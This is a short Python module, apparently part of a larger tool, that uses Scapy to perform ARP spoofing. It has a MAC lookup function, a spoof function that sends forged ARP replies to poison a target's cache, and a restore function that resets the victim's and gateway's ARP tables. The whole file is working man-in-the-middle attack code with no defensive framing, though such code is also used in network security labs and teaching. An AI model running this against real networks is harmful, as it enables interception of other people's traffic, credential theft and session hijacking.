from scapy.all import *
from scapy.layers.l2 import ARP, Ether
from .console import print_red

# Get the MAC address of a target IP
def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / arp_request

    answered_list = srp(packet, timeout=1, verbose=False)[0]

    for sent, received in answered_list:
        return received.hwsrc

    return None

# Send an ARP spoofing packet
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)

    if target_mac is None:
        print_red(f"[!] MAC address not found for {target_ip}. Skipping spoof.")
        return

    packet = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip
    )

    # Uncomment these lines to debug the packet content

    # packet.show()
    # print(packet.summary())

    sendp(packet, verbose=False)

# Restore the ARP table of the victim and gateway
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)

    packet = Ether(dst=destination_mac) / ARP(
        op=2,
        pdst=destination_ip,
        hwdst=destination_mac,
        psrc=source_ip,
        hwsrc=source_mac
    )

    send(packet, count=4, verbose=False)
